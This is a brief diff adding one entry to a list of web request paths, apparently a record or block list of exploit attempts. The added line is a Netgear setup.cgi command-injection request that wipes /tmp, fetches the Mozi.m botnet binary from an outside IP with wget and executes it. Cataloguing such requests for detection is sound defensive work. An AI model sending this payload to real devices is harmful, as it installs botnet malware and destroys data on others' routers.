@@ -2575,3 +2575,4 @@ google.com:443
 /wp/xmlrpc.php
 /public/assets/plugins/plupload/examples/upload.php
 /wp-content/plugins/dzs-zoomsounds/admin/upload.php
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://61.0.178.8:34826/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
